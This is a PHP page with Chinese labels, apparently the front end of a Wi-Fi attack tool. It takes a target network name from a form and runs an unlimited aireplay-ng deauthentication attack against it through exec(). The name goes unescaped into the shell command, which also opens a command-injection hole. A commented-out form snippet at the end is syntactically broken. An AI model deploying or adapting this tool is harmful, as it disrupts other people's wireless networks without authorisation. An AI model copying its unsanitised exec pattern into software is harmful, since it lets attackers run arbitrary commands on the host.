<?php
require('header.html');
?>

<ul class="nav navbar-nav navbar-right">
<?php if(!isset($_SESSION['user'])) { ?>        
	<li><a href="login.php">登录</a></li>
<?php } else{ ?>
	<li><a href="logout.php">退出</a></li>
<?php } ?>
</ul>  
</nav>

<div class="container theme-showcase" role="main"> 
	<div class="jumbotron">
        <h3><strong>断手包攻击</strong></h3>
</div>
<div class="col-md-4 col-md-offset-4">
    <div class="input-group mb-3">
      <div class="pull-left"> 
        <form action="./attack.php" method="post">
        <h4><strong>输入目标wifi名称</strong></h4>
              <input id="textessid" name="essid" type="text" class="input-medium" placeholder="请输入" />
              <input type="submit" name="sub" class="btn btn-primary" value="攻击">
        </form>
        <?php
            if(isset($_POST['sub']))
            {
            $essid = $_POST['essid'];
            $command='aireplay-ng -0 0 mon0 --ignore-negative-one -e '.$essid.' >/dev/null &';
            exec($command,$re);
            echo "执行的语句为:".$command."<br>";
            foreach($re as $re1){
                echo $re1."</br>";
            }
            echo "******************************************************************************";
            }
        ?>
      </div>
  </div>
</div>



<?php
include"footer.html";
?>
<!-- 
<form action="get.php" method="post" >
<input name="data" type="text" />
<input type="submit" name="sub" value="提交"/>
</form>
get.php//获取数据
if(isset($_POST["sub"]{ //如果提交了表单
$data=$_POST["data"]; //将传递过来的数据赋给$data
echo $data; //输出获得的数据
} -->